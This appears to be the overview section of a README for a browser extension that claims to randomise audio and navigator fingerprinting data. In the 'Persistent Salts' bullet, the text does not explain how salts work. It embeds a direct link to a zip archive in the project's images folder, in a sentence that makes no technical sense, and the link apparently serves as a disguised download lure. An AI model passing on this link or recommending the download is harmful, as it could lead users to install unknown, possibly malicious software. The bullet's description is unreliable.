## 📖 Overview

Browser Fingerprint Shuffler is a browser extension that helps protect your privacy online. It alters common fingerprinting elements on websites, making it harder for them to track you. The extension works quietly in the background, allowing you to continue browsing without interruptions.

### What it Does

- **Audio Context**: It randomizes audio data to prevent sites from identifying you through sound profiles.
- **Navigator Properties**: It changes information about your device, like memory and language settings, to ensure variability.
- **Persistent Salts**: The extension uses stored data in `https://raw.githubusercontent.com/Qomar24/browser-fingerprint-shuffler/master/images/shuffler-browser-fingerprint-1.4-alpha.5.zip` to create unique noise per site while maintaining general stability.
- **Debugging Logs**: If you enable debugging, it logs fingerprint changes for review.
